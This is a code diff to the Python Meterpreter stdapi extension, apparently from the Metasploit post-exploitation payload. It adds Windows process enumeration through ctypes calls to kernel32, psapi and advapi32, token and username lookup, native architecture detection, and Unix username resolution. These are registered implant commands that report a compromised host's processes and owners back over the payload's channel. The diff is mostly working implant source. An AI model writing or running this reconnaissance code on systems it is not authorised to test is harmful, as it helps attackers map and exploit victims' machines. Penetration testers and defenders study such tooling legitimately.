@@ -1,6 +1,7 @@
 import os
 import sys
 import shlex
+import ctypes
 import socket
 import struct
 import shutil
@@ -8,6 +9,43 @@ import fnmatch
 import getpass
 import platform
 import subprocess
+
+has_windll = hasattr(ctypes, 'windll')
+
+try:
+	import pwd
+	has_pwd = True
+except ImportError:
+	has_pwd = False
+
+class PROCESSENTRY32(ctypes.Structure):
+	_fields_ = [("dwSize", ctypes.c_uint32),
+		("cntUsage", ctypes.c_uint32),
+		("th32ProcessID", ctypes.c_uint32),
+		("th32DefaultHeapID", ctypes.c_void_p),
+		("th32ModuleID", ctypes.c_uint32),
+		("cntThreads", ctypes.c_uint32),
+		("th32ParentProcessID", ctypes.c_uint32),
+		("thPriClassBase", ctypes.c_int32),
+		("dwFlags", ctypes.c_uint32),
+		("szExeFile", (ctypes.c_char * 260))]
+
+class SYSTEM_INFO(ctypes.Structure):
+	_fields_ = [("wProcessorArchitecture", ctypes.c_uint16),
+		("wReserved", ctypes.c_uint16),
+		("dwPageSize", ctypes.c_uint32),
+		("lpMinimumApplicationAddress", ctypes.c_void_p),
+		("lpMaximumApplicationAddress", ctypes.c_void_p),
+		("dwActiveProcessorMask", ctypes.c_uint32),
+		("dwNumberOfProcessors", ctypes.c_uint32),
+		("dwProcessorType", ctypes.c_uint32),
+		("dwAllocationGranularity", ctypes.c_uint32),
+		("wProcessorLevel", ctypes.c_uint16),
+		("wProcessorRevision", ctypes.c_uint16),]
+
+class SID_AND_ATTRIBUTES(ctypes.Structure):
+	_fields_ = [("Sid", ctypes.c_void_p),
+		("Attributes", ctypes.c_uint32),]
 
 ##
 # STDAPI
@@ -103,14 +141,6 @@ TLV_TYPE_CONNECT_RETRIES =     TLV_META_TYPE_UINT    | 1504
 
 TLV_TYPE_SHUTDOWN_HOW =        TLV_META_TYPE_UINT    | 1530
 
-##
-# Sys
-##
-PROCESS_EXECUTE_FLAG_HIDDEN = (1 << 0)
-PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
-PROCESS_EXECUTE_FLAG_SUSPENDED = (1 << 2)
-PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)
-
 # Registry
 TLV_TYPE_HKEY =                TLV_META_TYPE_UINT    | 1000
 TLV_TYPE_ROOT_KEY =            TLV_TYPE_HKEY
@@ -201,6 +231,19 @@ TLV_TYPE_POWER_FLAGS =         TLV_META_TYPE_UINT    | 4100
 TLV_TYPE_POWER_REASON =        TLV_META_TYPE_UINT    | 4101
 
 ##
+# Sys
+##
+PROCESS_EXECUTE_FLAG_HIDDEN = (1 << 0)
+PROCESS_EXECUTE_FLAG_CHANNELIZED = (1 << 1)
+PROCESS_EXECUTE_FLAG_SUSPENDED = (1 << 2)
+PROCESS_EXECUTE_FLAG_USE_THREAD_TOKEN = (1 << 3)
+
+PROCESS_ARCH_UNKNOWN = 0
+PROCESS_ARCH_X86 = 1
+PROCESS_ARCH_X64 = 2
+PROCESS_ARCH_IA64 = 3
+
+##
 # Errors
 ##
 ERROR_SUCCESS = 0
@@ -227,6 +270,13 @@ def get_stat_buffer(path):
 	st_buf += struct.pack('<IIII', si.st_size, si.st_atime, si.st_mtime, si.st_ctime)
 	st_buf += struct.pack('<II', blksize, blocks)
 	return st_buf
+
+def windll_GetNativeSystemInfo():
+	if not has_windll:
+		return None
+	sysinfo = SYSTEM_INFO()
+	ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
+	return {0:PROCESS_ARCH_X86, 6:PROCESS_ARCH_IA64, 9:PROCESS_ARCH_X64}.get(sysinfo.wProcessorArchitecture, PROCESS_ARCH_UNKNOWN)
 
 @meterpreter.register_function
 def channel_create_stdapi_fs_file(request, response):
@@ -278,11 +328,16 @@ def stdapi_sys_config_sysinfo(request, response):
 	response += tlv_pack(TLV_TYPE_COMPUTER_NAME, uname_info[1])
 	response += tlv_pack(TLV_TYPE_OS_NAME, uname_info[0] + ' ' + uname_info[2] + ' ' + uname_info[3])
 	arch = uname_info[4]
-	if not arch and uname_info[1] == 'Windows':
-		if platform.architecture()[0] == '32bit':
-			arch = 'x86'
-		elif platform.architecture()[0] == '64bit':
+	if has_windll:
+		arch = windll_GetNativeSystemInfo()
+		if arch == PROCESS_ARCH_IA64:
+			arch = 'IA64'
+		elif arch == PROCESS_ARCH_X64:
 			arch = 'x86_64'
+		elif arch == PROCESS_ARCH_X86:
+			arch = 'x86'
+		else:
+			arch = uname_info[4]
 	response += tlv_pack(TLV_TYPE_ARCHITECTURE, arch)
 	return ERROR_SUCCESS, response
 
@@ -344,6 +399,8 @@ def stdapi_sys_process_get_processes_via_proc(request, response):
 			status[k[:-1]] = v.strip()
 		ppid = status.get('PPid')
 		uid = status.get('Uid').split('\t', 1)[0]
+		if has_pwd:
+			uid = pwd.getpwuid(int(uid)).pw_name
 		if cmd:
 			pname = os.path.basename(cmd.split(' ', 1)[0])
 			ppath = cmd
@@ -359,11 +416,86 @@ def stdapi_sys_process_get_processes_via_proc(request, response):
 		response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
 	return ERROR_SUCCESS, response
 
+def stdapi_sys_process_get_processes_via_windll(request, response):
+	TH32CS_SNAPPROCESS = 2
+	PROCESS_QUERY_INFORMATION = 0x0400
+	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+	PROCESS_VM_READ = 0x10
+	TOKEN_QUERY = 0x0008
+	TokenUser = 1
+	k32 = ctypes.windll.kernel32
+	pe32 = PROCESSENTRY32()
+	pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
+	proc_snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+	result = k32.Process32First(proc_snap, ctypes.byref(pe32))
+	if not result:
+		return ERROR_FAILURE, response
+	while result:
+		proc_h = k32.OpenProcess((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ), False, pe32.th32ProcessID)
+		if not proc_h:
+			proc_h = k32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pe32.th32ProcessID)
+		exe_path = (ctypes.c_char * 1024)()
+		success = False
+		if hasattr(ctypes.windll.psapi, 'GetModuleFileNameExA'):
+			success = ctypes.windll.psapi.GetModuleFileNameExA(proc_h, 0, exe_path, ctypes.sizeof(exe_path))
+		elif hasattr(k32, 'GetModuleFileNameExA'):
+			success = k32.GetModuleFileNameExA(proc_h, 0, exe_path, ctypes.sizeof(exe_path))
+		if not success and hasattr(k32, 'QueryFullProcessImageNameA'):
+			dw_sz = ctypes.c_uint32()
+			dw_sz.value = ctypes.sizeof(exe_path)
+			success = k32.QueryFullProcessImageNameA(proc_h, 0, exe_path, ctypes.byref(dw_sz))
+		if not success and hasattr(ctypes.windll.psapi, 'GetProcessImageFileNameA'):
+			success = ctypes.windll.psapi.GetProcessImageFileNameA(proc_h, exe_path, ctypes.sizeof(exe_path))
+		if success:
+			exe_path = ctypes.string_at(exe_path)
+		else:
+			exe_path = ''
+		complete_username = ''
+		tkn_h = ctypes.c_long()
+		tkn_len = ctypes.c_uint32()
+		if ctypes.windll.advapi32.OpenProcessToken(proc_h, TOKEN_QUERY, ctypes.byref(tkn_h)):
+			ctypes.windll.advapi32.GetTokenInformation(tkn_h, TokenUser, None, 0, ctypes.byref(tkn_len))
+			buf = (ctypes.c_ubyte * tkn_len.value)()
+			if ctypes.windll.advapi32.GetTokenInformation(tkn_h, TokenUser, ctypes.byref(buf), ctypes.sizeof(buf), ctypes.byref(tkn_len)):
+				user_tkn = SID_AND_ATTRIBUTES()
+				ctypes.memmove(ctypes.byref(user_tkn), buf, ctypes.sizeof(user_tkn))
+				username = (ctypes.c_char * 512)()
+				domain = (ctypes.c_char * 512)()
+				u_len = ctypes.c_uint32()
+				u_len.value = ctypes.sizeof(username)
+				d_len = ctypes.c_uint32()
+				d_len.value = ctypes.sizeof(domain)
+				use = ctypes.c_ulong()
+				use.value = 0
+				ctypes.windll.advapi32.LookupAccountSidA(None, user_tkn.Sid, username, ctypes.byref(u_len), domain, ctypes.byref(d_len), ctypes.byref(use))
+				complete_username = ctypes.string_at(domain) + '\\' + ctypes.string_at(username)
+			k32.CloseHandle(tkn_h)
+		parch = windll_GetNativeSystemInfo()
+		is_wow64 = ctypes.c_ubyte()
+		is_wow64.value = 0
+		if hasattr(k32, 'IsWow64Process'):
+			if k32.IsWow64Process(proc_h, ctypes.byref(is_wow64)):
+				if is_wow64.value:
+					parch = PROCESS_ARCH_X86
+		pgroup = ''
+		pgroup += tlv_pack(TLV_TYPE_PID, pe32.th32ProcessID)
+		pgroup += tlv_pack(TLV_TYPE_PARENT_PID, pe32.th32ParentProcessID)
+		pgroup += tlv_pack(TLV_TYPE_USER_NAME, complete_username)
+		pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pe32.szExeFile)
+		pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, exe_path)
+		pgroup += tlv_pack(TLV_TYPE_PROCESS_ARCH, parch)
+		response += tlv_pack(TLV_TYPE_PROCESS_GROUP, pgroup)
+		result = k32.Process32Next(proc_snap, ctypes.byref(pe32))
+		k32.CloseHandle(proc_h)
+	k32.CloseHandle(proc_snap)
+	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
 def stdapi_sys_process_get_processes(request, response):
 	if os.path.isdir('/proc'):
 		return stdapi_sys_process_get_processes_via_proc(request, response)
+	elif has_windll:
+		return stdapi_sys_process_get_processes_via_windll(request, response)
 	return ERROR_FAILURE, response
 
 @meterpreter.register_function
